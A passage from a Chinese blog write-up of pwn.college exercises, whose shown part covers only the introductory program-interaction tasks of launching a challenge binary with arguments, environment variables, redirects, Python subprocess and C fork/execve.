<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>追本溯源：pwn.college 作业记录 - Lab on Mercury</title><meta name=Description content="Lab on Mercury"><meta property="og:title" content="追本溯源：pwn.college 作业记录"><meta property="og:description" content="时隔许久，我居然又得做 pwn 题了。"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.sigmerc.top/pwn-college/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-02-24T20:03:11+00:00"><meta property="article:modified_time" content="2022-02-24T20:03:11+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="追本溯源：pwn.college 作业记录"><meta name=twitter:description content="时隔许久，我居然又得做 pwn 题了。"><meta name=application-name content="Lab on Mercury"><meta name=apple-mobile-web-app-title content="Lab on Mercury"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://blog.sigmerc.top/pwn-college/><link rel=prev href=https://blog.sigmerc.top/pet/><link rel=next href=https://blog.sigmerc.top/hugo/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"追本溯源：pwn.college 作业记录","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sigmerc.top\/pwn-college\/"},"genre":"posts","keywords":"Linux, C\/C\u002b\u002b, Python, 整数溢出, 栈漏洞","wordcount":6201,"url":"https:\/\/blog.sigmerc.top\/pwn-college\/","datePublished":"2022-02-24T20:03:11+00:00","dateModified":"2022-02-24T20:03:11+00:00","publisher":{"@type":"Organization","name":"Mercury","logo":{"@type":"ImageObject","url":"https:\/\/blog.sigmerc.top\/my_avatar.png","width":400,"height":400}},"author":{"@type":"Person","name":"Mercury"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/><i class="fas fa-archive fa-fw"></i> 文章 </a><a class=menu-item href=/tags/><i class="fas fa-tags fa-fw"></i> 标签 </a><a class=menu-item href=/categories/><i class="fas fa-th fa-fw"></i> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title><i class="fas fa-archive fa-fw"></i>文章</a><a class=menu-item href=/tags/ title><i class="fas fa-tags fa-fw"></i>标签</a><a class=menu-item href=/categories/ title><i class="fas fa-th fa-fw"></i>分类</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">追本溯源：pwn.college 作业记录</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Mercury</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/><i class="far fa-folder fa-fw"></i>二进制安全</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2022-02-24>2022-02-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 6201 字&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 13 分钟&nbsp;<span id=/pwn-college/ class=leancloud_visitors data-flag-title="追本溯源：pwn.college 作业记录">
<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
</span>&nbsp;</div></div><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnCollege/0.png data-srcset="https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnCollege/0.png, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnCollege/0.png 1.5x, https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnCollege/0.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnCollege/0.png title=https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnCollege/0.png></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#embryoio-program-interaction>embryoio: Program Interaction</a><ul><li><a href=#1>1</a></li><li><a href=#2>2</a></li><li><a href=#3>3</a></li><li><a href=#4>4</a></li><li><a href=#5>5</a></li><li><a href=#6>6</a></li><li><a href=#7>7</a></li><li><a href=#8>8</a></li><li><a href=#9-14>9-14</a></li><li><a href=#15>15</a></li><li><a href=#16>16</a></li><li><a href=#17>17</a></li><li><a href=#18>18</a></li><li><a href=#19>19</a></li><li><a href=#20>20</a></li><li><a href=#21>21</a></li><li><a href=#22>22</a></li><li><a href=#23-28>23-28</a></li><li><a href=#29>29</a></li><li><a href=#30>30</a></li><li><a href=#31>31</a></li><li><a href=#32>32</a></li><li><a href=#33>33</a></li><li><a href=#34>34</a></li><li><a href=#35>35</a></li><li><a href=#36>36</a></li><li><a href=#37>37</a></li><li><a href=#38>38</a></li><li><a href=#39>39</a></li><li><a href=#40>40</a></li><li><a href=#41>41</a></li><li><a href=#42-47>42-47</a></li><li><a href=#48>48</a></li><li><a href=#49>49</a></li><li><a href=#50>50</a></li><li><a href=#51>51</a></li><li><a href=#52>52</a></li><li><a href=#53>53</a></li><li><a href=#54-59>54-59</a></li><li><a href=#60-65>60-65</a></li><li><a href=#66>66</a></li><li><a href=#67>67</a></li><li><a href=#68>68</a></li><li><a href=#69>69</a></li><li><a href=#70>70</a></li><li><a href=#71>71</a></li><li><a href=#72>72</a></li><li><a href=#73>73</a></li><li><a href=#74>74</a></li></ul></li><li><a href=#babysuid-program-misuse>babysuid: Program Misuse</a><ul><li><a href=#1-9>1-9</a></li><li><a href=#10>10</a></li><li><a href=#11>11</a></li><li><a href=#12>12</a></li><li><a href=#13>13</a></li><li><a href=#14>14</a></li><li><a href=#15-1>15</a></li><li><a href=#16-1>16</a></li><li><a href=#17-1>17</a></li><li><a href=#18-1>18</a></li><li><a href=#19-1>19</a></li><li><a href=#20-1>20</a></li><li><a href=#21-1>21</a></li></ul></li><li><a href=#embryoasm-assembly-refresher>embryoasm: Assembly Refresher</a><ul><li><a href=#1-1>1</a></li><li><a href=#2-1>2</a></li><li><a href=#3-1>3</a></li><li><a href=#4-1>4</a></li><li><a href=#5-1>5</a></li><li><a href=#6-1>6</a></li><li><a href=#7-1>7</a></li><li><a href=#8-1>8</a></li><li><a href=#9>9</a></li><li><a href=#10-1>10</a></li><li><a href=#11-1>11</a></li><li><a href=#12-1>12</a></li><li><a href=#13-1>13</a></li><li><a href=#14-1>14</a></li><li><a href=#15-2>15</a></li><li><a href=#16-2>16</a></li><li><a href=#17-2>17</a></li><li><a href=#18-2>18</a></li><li><a href=#19-2>19</a></li><li><a href=#20-2>20</a></li><li><a href=#21-2>21</a></li><li><a href=#22-1>22</a></li><li><a href=#23>23</a></li></ul></li><li><a href=#babyshell-shellcode-injection>babyshell: Shellcode Injection</a><ul><li><a href=#1-2>1</a></li><li><a href=#2-2>2</a></li><li><a href=#3-2>3</a></li><li><a href=#4-2>4</a></li><li><a href=#5-2>5</a></li><li><a href=#6-2>6</a></li><li><a href=#7-2>7</a></li><li><a href=#8-2>8</a></li><li><a href=#9-1>9</a></li><li><a href=#10-12>10-12</a></li><li><a href=#13-2>13</a></li><li><a href=#14-2>14</a></li></ul></li><li><a href=#babymem-memory-errors>babymem: Memory Errors</a><ul><li><a href=#10-2>1.0</a></li><li><a href=#11-2>1.1</a></li><li><a href=#20-3>2.0</a></li><li><a href=#21-3>2.1</a></li><li><a href=#30-1>3.0</a></li><li><a href=#31-1>3.1</a></li><li><a href=#40-1>4.0</a></li><li><a href=#50-1>5.0</a></li><li><a href=#60>6.0</a></li><li><a href=#70-1>7.0</a></li><li><a href=#80>8.0</a></li><li><a href=#90>9.0</a></li><li><a href=#100>10.0</a></li><li><a href=#110>11.0</a></li><li><a href=#120>12.0</a></li><li><a href=#130>13.0</a></li><li><a href=#140>14.0</a></li><li><a href=#150>15.0</a></li></ul></li><li><a href=#toddlerone-exploitation-scenarios>toddlerone: Exploitation Scenarios</a><ul><li><a href=#10-3>1.0</a></li><li><a href=#20-4>2.0</a></li><li><a href=#30-2>3.0</a></li><li><a href=#40-2>4.0</a></li><li><a href=#50-2>5.0</a></li><li><a href=#60-1>6.0</a></li></ul></li></ul></nav></div></div><div class=content id=content><p>时隔许久，我居然又得做 pwn 题了。</p><h2 id=embryoio-program-interaction>embryoio: Program Interaction</h2><h3 id=1>1</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=2>2</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span>
</span></span><span class=line><span class=cl><span class=c1># ...</span>
</span></span><span class=line><span class=cl>jdlwsscr
</span></span></code></pre></td></tr></table></div></div><h3 id=3>3</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span> ommhsqruhu
</span></span></code></pre></td></tr></table></div></div><h3 id=4>4</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ <span class=nv>ykpoaq</span><span class=o>=</span>vpysbewhjx /challenge/<span class=nv>$HOSTNAME</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=5>5</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ <span class=nb>echo</span> mvrlsgks &gt; /tmp/uulqde
</span></span><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span> &lt; /tmp/uulqde
</span></span></code></pre></td></tr></table></div></div><h3 id=6>6</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span> &gt; /tmp/npruin
</span></span><span class=line><span class=cl>$ cat /tmp/npruin
</span></span></code></pre></td></tr></table></div></div><h3 id=7>7</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ env -i /challenge/<span class=nv>$HOSTNAME</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=8>8</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s2>&#34;/challenge/</span><span class=nv>$HOSTNAME</span><span class=s2>&#34;</span> &gt; ~/myscript.sh
</span></span><span class=line><span class=cl>$ bash ~/myscript.sh
</span></span></code></pre></td></tr></table></div></div><h3 id=9-14>9-14</h3><p>类似 1-7，但是使用了 8 的方法。</p><h3 id=15>15</h3><p>运行 <code>ipython</code>，然后输入：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>16-21 均需要在 ipython 环境下执行。</p><h3 id=16>16</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=nb>echo</span> ztrvysos &gt; input
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=nb>open</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=17>17</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>([</span><span class=n>binary</span><span class=p>,</span> <span class=s1>&#39;dynoamrymg&#39;</span><span class=p>])</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=18>18</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=nb>dict</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=p>,</span> <span class=n>iybxon</span><span class=o>=</span><span class=s2>&#34;lcoldvawsc&#34;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=19>19</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ <span class=nb>echo</span> dtzlsano &gt; /tmp/ofslag
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=nb>open</span><span class=p>(</span><span class=s2>&#34;/tmp/ofslag&#34;</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=20>20</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=nb>open</span><span class=p>(</span><span class=s2>&#34;/tmp/gicfkh&#34;</span><span class=p>,</span><span class=s2>&#34;w+&#34;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=21>21</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>env</span><span class=o>=</span><span class=nb>dict</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=22>22</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span><span class=o>.</span><span class=n>wait</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=23-28>23-28</h3><p>类似 16-21，但使用了 22 的方法。</p><h3 id=29>29</h3><p>29-35 模版，核心代码位于 <code>/* TODO */</code> 处：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/wait.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>pwncollege</span><span class=p>()</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>binary</span><span class=p>[</span><span class=mi>30</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;/challenge/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>strcat</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>getenv</span><span class=p>(</span><span class=s>&#34;HOSTNAME&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* TODO */</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>核心代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=n>pid</span> <span class=o>=</span> <span class=n>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>pid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>wait</span><span class=p>(</span><span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>fork()</code> 出子进程执行二进制文件，使得其父进程为我们自己的程序。</p><h3 id=30>30</h3><p>同上。</p><h3 id=31>31</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=n>binary</span><span class=p>,</span> <span class=s>&#34;pxcsyjgoss&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>pid</span> <span class=o>=</span> <span class=n>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>pid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
